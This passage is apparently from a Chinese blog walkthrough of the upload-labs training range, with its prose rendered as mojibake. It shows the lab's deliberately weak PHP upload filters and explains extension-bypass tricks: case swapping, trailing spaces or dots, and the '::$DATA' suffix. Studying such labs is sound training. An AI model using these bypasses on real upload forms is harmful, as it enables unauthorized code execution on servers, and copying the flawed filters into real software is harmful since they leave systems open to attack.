class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Windowsç³»ç»Ÿå¯¹å¤§å°å†™å¹¶ä¸æ•æ„Ÿï¼Œè€Œè¿™ä¸ªæ£€æµ‹æœºåˆ¶å®ƒæ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦éšæœºè®©å‡ ä¸ªå­—æ¯å¤§å°å†™äº’æ¢å³å¯ã€‚</p><p>åˆ‡æ¢ç‰ˆæœ¬ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932010.png"></p><p>ä½¿ç”¨BPæŠ“åŒ…ï¼Œå°†æ–‡ä»¶åç¼€åçš„å°å†™å˜æˆå¤§å†™</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932497.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932202.png"></p><h3 id="Pass-07-ç©ºæ ¼ç»•è¿‡"><a href="#Pass-07-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="Pass-07_ç©ºæ ¼ç»•è¿‡"></a>Pass-07_ç©ºæ ¼ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŠ“åŒ…åŠ ç©ºæ ¼</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932479.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932081.png"></p><h3 id="Pass-08-ç‚¹ç»•è¿‡"><a href="#Pass-08-ç‚¹ç»•è¿‡" class="headerlink" title="Pass-08_ç‚¹ç»•è¿‡"></a>Pass-08_ç‚¹ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŠ ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021933068.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932765.png"></p><h3 id="Pass-09-DATAç»•è¿‡"><a href="#Pass-09-DATAç»•è¿‡" class="headerlink" title="Pass-09_::$DATAç»•è¿‡"></a>Pass-09_<code>::$DATA</code>ç»•è¿‡</h3><p>åŸç†:Windowsç³»ç»Ÿä¸‹ï¼Œå¦‚æœä¸Šä¼ çš„æ–‡ä»¶åæ˜¯<code>test.php::$DATA</code>ï¼Œä¼šåœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆä¸€ä¸ª<code>test.php</code>çš„æ–‡ä»¶ï¼Œå…¶ä¸­å†…å®¹å’Œæ‰€ä¸Šä¼ æ–‡ä»¶å†…å®¹ç›¸åŒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸€å…³å°‘äº†å‰å‡ å…³ä¸­çš„<code> $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</code>ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨<code>::$DATA</code>ç»•è¿‡</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021937853.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021937320.png" alt="null"></p><h3 id="Pass-10-æ‹¼æ¥è·¯å¾„"><a href="#Pass-10-æ‹¼æ¥è·¯å¾„" class="headerlink" title="Pass-10-æ‹¼æ¥è·¯å¾„"></a>Pass-10-æ‹¼æ¥è·¯å¾„</h3><p>æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<span class="hljs-comment">//è·å–æ–‡ä»¶æ‰©å±•å</span><br>        <span class="hljs-variable">$file_ext</span> = 